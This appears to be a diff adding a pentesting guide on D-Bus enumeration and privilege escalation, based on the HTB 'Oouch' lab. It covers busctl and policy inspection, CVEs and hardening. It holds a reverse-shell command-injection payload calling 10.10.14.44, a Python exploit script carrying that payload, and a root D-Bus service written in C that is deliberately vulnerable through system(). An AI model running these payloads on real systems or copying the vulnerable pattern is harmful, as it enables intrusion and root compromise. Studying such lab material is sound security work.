@@ -1,0 +1,601 @@
+# D-Bus Enumeration & Command Injection Privilege Escalation
+
+{{#include ../../banners/hacktricks-training.md}}
+
+## **GUI enumeration**
+
+D-Bus is utilized as the inter-process communications (IPC) mediator in Ubuntu desktop environments. On Ubuntu, the concurrent operation of several message buses is observed: the system bus, primarily utilized by **privileged services to expose services relevant across the system**, and a session bus for each logged-in user, exposing services relevant only to that specific user. The focus here is primarily on the system bus due to its association with services running at higher privileges (e.g., root) as our objective is to elevate privileges. It is noted that D-Bus's architecture employs a 'router' per session bus, which is responsible for redirecting client messages to the appropriate services based on the address specified by the clients for the service they wish to communicate with.<sup>[[1]](#references)</sup>
+
+Services on D-Bus are defined by the **objects** and **interfaces** they expose. Objects can be likened to class instances in standard OOP languages, with each instance uniquely identified by an **object path**. This path, akin to a filesystem path, uniquely identifies each object exposed by the service. A key interface for research purposes is the **org.freedesktop.DBus.Introspectable** interface, featuring a singular method, Introspect. This method returns an XML representation of the object's supported methods, signals, and properties, with a focus here on methods while omitting properties and signals.
+
+For communication with the D-Bus interface, two tools were employed: a CLI tool named **gdbus** for easy invocation of methods exposed by D-Bus in scripts, and [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), a Python-based GUI tool designed to enumerate the services available on each bus and to display the objects contained within each service.
+
+```bash
+sudo apt-get install d-feet
+```
+
+If you are checking the **session bus**, confirm the current address first:
+
+```bash
+echo "$DBUS_SESSION_BUS_ADDRESS"
+```
+
+![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)
+
+![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
+
+In the first image services registered with the D-Bus system bus are shown, with **org.debin.apt** specifically highlighted after selecting the System Bus button. D-Feet queries this service for objects, displaying interfaces, methods, properties, and signals for chosen objects, seen in the second image. Each method's signature is also detailed.
+
+A notable feature is the display of the service's **process ID (pid)** and **command line**, useful for confirming if the service runs with elevated privileges, important for research relevance.
+
+**D-Feet also allows method invocation**: users can input Python expressions as parameters, which D-Feet converts to D-Bus types before passing to the service.
+
+However, note that **some methods require authentication** before allowing us to invoke them. We will ignore these methods, since our goal is to elevate our privileges without credentials in the first place.
+
+Also note that some of the services query another D-Bus service named org.freedeskto.PolicyKit1 whether a user should be allowed to perform certain actions or not.
+
+## **Cmd line Enumeration**
+
+### List Service Objects
+
+It's possible to list opened D-Bus interfaces with:
+
+```bash
+busctl list #List D-Bus interfaces
+
+NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
+:1.0                                     1 systemd         root             :1.0          init.scope                -
+:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
+:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
+:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
+:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
+:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
+:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
+:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
+com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
+fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
+fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
+htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
+org.bluez                                - -               -                (activatable) -                         -
+org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
+org.freedesktop.PackageKit               - -               -                (activatable) -                         -
+org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
+org.freedesktop.hostname1                - -               -                (activatable) -                         -
+org.freedesktop.locale1                  - -               -                (activatable) -                         -
+```
+
+Services marked as **`(activatable)`** are especially interesting because they are **not running yet**, but a bus request can start them on demand. Do not stop at `busctl list`; map those names to the actual binaries they would execute.
+
+```bash
+ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
+grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
+```
+
+That quickly tells you which `Exec=` path will start for an activatable name and under which identity. If the binary or its execution chain is weakly protected, an inactive service can still become a privilege-escalation path.
+
+#### Connections
+
+[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) When a process sets up a connection to a bus, the bus assigns to the connection a special bus name called _unique connection name_. Bus names of this type are immutable—it's guaranteed they won't change as long as the connection exists—and, more importantly, they can't be reused during the bus lifetime. This means that no other connection to that bus will ever have assigned such unique connection name, even if the same process closes down the connection to the bus and creates a new one. Unique connection names are easily recognizable because they start with the—otherwise forbidden—colon character.<sup>[[4]](#references)</sup>
+
+### Service Object Info
+
+Then, you can obtain some information about the interface with:
+
+```bash
+busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
+
+PID=2609
+PPID=1
+TTY=n/a
+UID=0
+EUID=0
+SUID=0
+FSUID=0
+GID=0
+EGID=0
+SGID=0
+FSGID=0
+SupplementaryGIDs=
+Comm=dbus-server
+CommandLine=/root/dbus-server
+Label=unconfined
+CGroup=/system.slice/dbus-server.service
+Unit=dbus-server.service
+Slice=system.slice
+UserUnit=n/a
+UserSlice=n/a
+Session=n/a
+AuditLoginUID=n/a
+AuditSessionID=n/a
+UniqueName=:1.3
+EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
+        cap_fowner cap_fsetid cap_kill cap_setgid
+        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
+        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
+        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
+        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
+        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
+        cap_mknod cap_lease cap_audit_write cap_audit_control
+        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
+        cap_wake_alarm cap_block_suspend cap_audit_read
+PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
+        cap_fowner cap_fsetid cap_kill cap_setgid
+        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
+        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
+        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
+        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
+        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
+        cap_mknod cap_lease cap_audit_write cap_audit_control
+        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
+        cap_wake_alarm cap_block_suspend cap_audit_read
+InheritableCapabilities=
+BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
+        cap_fowner cap_fsetid cap_kill cap_setgid
+        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
+        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
+        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
+        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
+        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
+        cap_mknod cap_lease cap_audit_write cap_audit_control
+        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
+        cap_wake_alarm cap_block_suspend cap_audit_read
+```
+
+Also correlate the bus name with its `systemd` unit and executable path:
+
+```bash
+systemctl status dbus-server.service --no-pager
+systemctl cat dbus-server.service
+namei -l /root/dbus-server
+```
+
+This answers the operational question that matters during privesc: **if a method call succeeds, which real binary and unit will perform the action?**
+
+### List Interfaces of a Service Object
+
+You need to have enough permissions.
+
+```bash
+busctl tree htb.oouch.Block #Get Interfaces of the service object
+
+└─/htb
+  └─/htb/oouch
+    └─/htb/oouch/Block
+```
+
+### Introspect Interface of a Service Object
+
+Note how in this example it was selected the latest interface discovered using the `tree` parameter (_see previous section_):
+
+```bash
+busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
+
+NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
+htb.oouch.Block                     interface -         -            -
+.Block                              method    s         s            -
+org.freedesktop.DBus.Introspectable interface -         -            -
+.Introspect                         method    -         s            -
+org.freedesktop.DBus.Peer           interface -         -            -
+.GetMachineId                       method    -         s            -
+.Ping                               method    -         -            -
+org.freedesktop.DBus.Properties     interface -         -            -
+.Get                                method    ss        v            -
+.GetAll                             method    s         a{sv}        -
+.Set                                method    ssv       -            -
+.PropertiesChanged                  signal    sa{sv}as  -            -
+```
+
+Note the method `.Block` of the interface `htb.oouch.Block` (the one we are interested in). The "s" of the other columns may mean that it's expecting a string.
+
+Before trying anything dangerous, validate a **read-oriented** or otherwise low-risk method first. This separates three cases cleanly: wrong syntax, reachable but denied, or reachable and allowed.
+
+```bash
+busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
+gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
+```
+
+### Correlate D-Bus Methods with Policies and Actions
+
+Introspection tells you **what** you can call, but it does not tell you **why** a call is allowed or denied. For real privesc triage you usually need to inspect **three layers together**:
+
+1. **Activation metadata** (`.service` files or `SystemdService=`) to learn which binary and unit will actually run.
+2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) to learn who may `own`, `send_destination`, or `receive_sender`.
+3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) to learn the default authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).
+
+Useful commands:
+
+```bash
+grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
+grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
+grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
+pkaction --verbose
+```
+
+Do **not** assume a 1:1 mapping between a D-Bus method and a Polkit action. The same method may choose a different action depending on the object being modified or on runtime context. Therefore the practical workflow is:
+
+1. `busctl introspect` / `gdbus introspect`
+2. `pkaction --verbose` and grep the relevant `.policy` files
+3. low-risk live probes with `busctl call`, `gdbus call`, or `dbusmap --enable-probes --null-agent`
+
+Proxy or compatibility services deserve extra attention. A **root-running proxy** that forwards requests to another D-Bus service over its own pre-established connection can accidentally make the backend treat every request as coming from UID 0 unless the original caller identity is re-validated.<sup>[[3]](#references)</sup>
+
+### Monitor/Capture Interface
+
+With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.
+
+In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+
+> [!WARNING]
+> If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!
+
+Different ways to monitor:
+
+```bash
+sudo busctl monitor htb.oouch.Block #Monitor only specified
+sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
+sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
+```
+
+In the following example the interface `htb.oouch.Block` is monitored and **the message "**_**lalalalal**_**" is sent through miscommunication**:
+
+```bash
+busctl monitor htb.oouch.Block
+
+Monitoring bus message stream.
+‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
+  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
+  UniqueName=:1.1376
+  MESSAGE "s" {
+          STRING "lalalalal";
+  };
+
+‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
+  Sender=:1.3  Destination=:1.1376
+  UniqueName=:1.3
+  MESSAGE "s" {
+          STRING "Carried out :D";
+  };
+```
+
+You can use `capture` instead of `monitor` to save the results in a **pcapng** file that Wireshark can open:
+
+```bash
+sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
+sudo busctl capture > system-bus.pcapng
+```
+
+#### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
+
+If there is just too much information on the bus, pass a match rule like so:
+
+```bash
+dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
+```
+
+Multiple rules can be specified. If a message matches _any_ of the rules, the message will be printed. Like so:
+
+```bash
+dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
+```
+
+```bash
+dbus-monitor "type=method_call" "type=method_return" "type=error"
+```
+
+See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) for more information on match rule syntax.<sup>[[7]](#references)</sup>
+
+### More
+
+`busctl` has even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).
+
+## **Vulnerable Scenario**
+
+As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-Bus config file** located in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
+
+<!DOCTYPE busconfig PUBLIC
+ "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
+ "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+
+<busconfig>
+
+    <policy user="root">
+        <allow own="htb.oouch.Block"/>
+    </policy>
+
+	<policy user="www-data">
+		<allow send_destination="htb.oouch.Block"/>
+		<allow receive_sender="htb.oouch.Block"/>
+	</policy>
+
+</busconfig>
+```
+
+Note from the previous configuration that **you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.
+
+As user **qtc** inside the docker container **aeb4525789d8** you can find some dbus related code in the file _/code/oouch/routes.py._ This is the interesting code:
+
+```python
+if primitive_xss.search(form.textfield.data):
+        bus = dbus.SystemBus()
+        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
+        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
+
+        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
+        response = block_iface.Block(client_ip)
+        bus.close()
+        return render_template('hacker.html', title='Hacker')
+```
+
+As you can see, it is **connecting to a D-Bus interface** and sending to the **"Block" function** the "client_ip".
+
+In the other side of the D-Bus connection there is some C compiled binary running. This code is **listening** in the D-Bus connection **for IP address and is calling iptables via `system` function** to block the given IP address.\
+**The call to `system` is vulnerable on purpose to command injection**, so a payload like the following one will create a reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+
+### Exploit it
+
+At the end of this page you can find the **complete C code of the D-Bus application**. Inside of it you can find between the lines 91-97 **how the `D-Bus object path`** **and `interface name`** are **registered**. This information will be necessary to send information to the D-Bus connection:
+
+```c
+        /* Install the object */
+        r = sd_bus_add_object_vtable(bus,
+                                     &slot,
+                                     "/htb/oouch/Block",  /* interface */
+                                     "htb.oouch.Block",   /* service object */
+                                     block_vtable,
+                                     NULL);
+```
+
+Also, in line 57 you can find that **the only method registered** for this D-Bus communication is called `Block`(_**Thats why in the following section the payloads are going to be sent to the service object `htb.oouch.Block`, the interface `/htb/oouch/Block` and the method name `Block`**_):
+
+```c
+SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
+```
+
+#### Python
+
+The following python code will send the payload to the D-Bus connection to the `Block` method via `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):
+
+```python
+import dbus
+bus = dbus.SystemBus()
+block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
+block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
+runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
+response = block_iface.Block(runme)
+bus.close()
+```
+
+#### busctl and dbus-send
+
+```bash
+dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
+```
+
+- `dbus-send` is a tool used to send message to “Message Bus”
+- Message Bus – A software used by systems to make communications between applications easily. It’s related to Message Queue (messages are ordered in sequence) but in Message Bus the messages are sending in a subscription model and also very quick.
+- “-system” tag is used to mention that it is a system message, not a session message (by default).
+- “–print-reply” tag is used to print our message appropriately and receives any replies in a human-readable format.
+- “–dest=Dbus-Interface-Block” The address of the Dbus interface.
+- “–string:” – Type of message we like to send to the interface. There are several formats of sending messages like double, bytes, booleans, int, objpath. Out of this, the “object path” is useful when we want to send a path of a file to the Dbus interface. We can use a special file (FIFO) in this case to pass a command to interface in the name of a file. “string:;” – This is to call the object path again where we place of FIFO reverse shell file/command.
+
+_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._
+
+### C code
+
+```c:d-bus_server.c
+//sudo apt install pkgconf
+//sudo apt install libsystemd-dev
+//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+#include <systemd/sd-bus.h>
+
+static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
+        char* host = NULL;
+        int r;
+
+        /* Read the parameters */
+        r = sd_bus_message_read(m, "s", &host);
+        if (r < 0) {
+                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
+                return r;
+        }
+
+        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";
+
+        int command_len = strlen(command);
+        int host_len = strlen(host);
+
+        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
+        if(command_buffer == NULL) {
+                fprintf(stderr, "Failed to allocate memory\n");
+                return -1;
+        }
+
+        sprintf(command_buffer, command, host);
+
+        /* In the first implementation, we simply ran command using system(), since the expected DBus
+         * to be threading automatically. However, DBus does not thread and the application will hang
+         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
+         * multithreading)
+         */
+        int pid = fork();
+
+        if ( pid == 0 ) {
+            /* Here we are in the child process. We execute the command and eventually exit. */
+            system(command_buffer);
+            exit(0);
+        } else {
+            /* Here we are in the parent process or an error occured. We simply send a genric message.
+             * In the first implementation we returned separate error messages for success or failure.
+             * However, now we cannot wait for results of the system call. Therefore we simply return
+             * a generic. */
+            return sd_bus_reply_method_return(m, "s", "Carried out :D");
+        }
+        r = system(command_buffer);
+}
+
+
+/* The vtable of our little object, implements the net.poettering.Calculator interface */
+static const sd_bus_vtable block_vtable[] = {
+        SD_BUS_VTABLE_START(0),
+        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
+        SD_BUS_VTABLE_END
+};
+
+
+int main(int argc, char *argv[]) {
+        /*
+         * Main method, registeres the htb.oouch.Block service on the system dbus.
+         *
+         * Paramaters:
+         *      argc            (int)             Number of arguments, not required
+         *      argv[]          (char**)          Argument array, not required
+         *
+         * Returns:
+         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
+         *      as long as the user keeps it alive.
+         */
+
+
+        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
+        signal(SIGCHLD,SIG_IGN);
+
+        sd_bus_slot *slot = NULL;
+        sd_bus *bus = NULL;
+        int r;
+
+        /* First we need to connect to the system bus. */
+        r = sd_bus_open_system(&bus);
+        if (r < 0)
+        {
+                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
+                goto finish;
+        }
+
+        /* Install the object */
+        r = sd_bus_add_object_vtable(bus,
+                                     &slot,
+                                     "/htb/oouch/Block",  /* interface */
+                                     "htb.oouch.Block",   /* service object */
+                                     block_vtable,
+                                     NULL);
+        if (r < 0) {
+                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
+                goto finish;
+        }
+
+        /* Register the service name to find out object */
+        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
+        if (r < 0) {
+                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
+                goto finish;
+        }
+
+        /* Infinite loop to process the client requests */
+        for (;;) {
+                /* Process requests */
+                r = sd_bus_process(bus, NULL);
+                if (r < 0) {
+                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
+                        goto finish;
+                }
+                if (r > 0) /* we processed a request, try to process another one, right-away */
+                        continue;
+
+                /* Wait for the next request to process */
+                r = sd_bus_wait(bus, (uint64_t) -1);
+                if (r < 0) {
+                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
+                        goto finish;
+                }
+        }
+
+finish:
+        sd_bus_slot_unref(slot);
+        sd_bus_unref(bus);
+
+        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
+}
+```
+
+## Automated Enumeration Helpers (2023-2025)
+
+Enumeration of a large D-Bus attack surface manually with `busctl`/`gdbus` quickly becomes painful. Two small FOSS utilities released in the last few years can speed things up during red-team or CTF engagements:
+
+### dbusmap ("Nmap for D-Bus")
+* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
+* Written in C; single static binary (<50 kB) that walks every object path, pulls the `Introspect` XML and maps it to the owning PID/UID.<sup>[[5]](#references)</sup>
+* Useful flags:
+  ```bash
+  # List every service on the *system* bus and dump all callable methods
+  sudo dbus-map --dump-methods
+
+  # Actively probe methods/properties you can reach without Polkit prompts
+  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
+  ```
+* The tool marks unprotected well-known names with `!`, instantly revealing services you can *own* (take over) or method calls that are reachable from an unprivileged shell.
+
+### uptux.py
+* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
+* Python-only script that looks for *writable* paths in systemd units **and** overly-permissive D-Bus policy files (e.g. `send_destination="*"`).<sup>[[6]](#references)</sup>
+* Quick usage:
+  ```bash
+  python3 uptux.py -n          # run all checks but don’t write a log file
+  python3 uptux.py -d          # enable verbose debug output
+  ```
+* The D-Bus module searches the directories below and highlights any service that can be spoofed or hijacked by a normal user:
+  * `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
+  * `/etc/dbus-1/system-local.d/` (vendor overrides)
+
+---
+
+## Notable D-Bus Privilege-Escalation Bugs (2024-2025)
+
+Keeping an eye on recently published CVEs helps spotting similar insecure patterns in custom code. Two good recent examples are:<sup>[[2]](#references)[[3]](#references)</sup>
+
+| Year | CVE | Component | Root Cause | Offensive lesson |
+|------|-----|-----------|------------|------------------|
+| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | The root-running service exposed a D-Bus interface that unprivileged users could reconfigure, including loading attacker-controlled macro behavior. | If a daemon exposes **device/profile/config management** on the system bus, treat writable configuration and macro features as code-execution primitives, not just "settings". |
+| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | A root-running compatibility proxy forwarded requests to backend services without preserving the original caller's security context, so backends trusted the proxy as UID 0. | Treat **proxy / bridge / compatibility** D-Bus services as a separate bug class: if they relay privileged calls, verify how caller UID/Polkit context reaches the backend. |
+
+Patterns to notice:
+1. Service runs **as root on the system bus**.
+2. Either there is **no authorization check**, or the check is performed against the **wrong subject**.
+3. The reachable method eventually changes system state: package install, user/group changes, bootloader config, device profile updates, file writes, or direct command execution.
+
+Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a method is reachable, then inspect the service's policy XML and Polkit actions to understand **which subject** is actually being authorized.
+
+---
+
+## Hardening & Detection Quick-Wins
+
+* Search for world-writable or *send/receive*-open policies:
+  ```bash
+  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
+  ```
+* Require Polkit for dangerous methods – even *root* proxies should pass the *caller* PID to `polkit_authority_check_authorization_sync()` instead of their own.
+* Drop privileges in long-running helpers (use `sd_pid_get_owner_uid()` to switch namespaces after connecting to the bus).
+* If you cannot remove a service, at least *scope* it to a dedicated Unix group and restrict access in its XML policy.
+* Blue-team: capture the system bus with `busctl capture > /var/log/dbus_$(date +%F).pcapng` and import it into Wireshark for anomaly detection.
+
+---
+
+## References
+
+- [1] [USBCreator D-Bus Privilege Escalation in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
+- [2] [CVE-2024-45752: D-Bus service allows configuration by any unprivileged user](https://github.com/PixlOne/logiops/issues/473)
+- [3] [dde-api-proxy: Authentication Bypass in Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
+- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
+- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
+- [6] [initstring/uptux](https://github.com/initstring/uptux)
+- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
+
+{{#include ../../banners/hacktricks-training.md}}
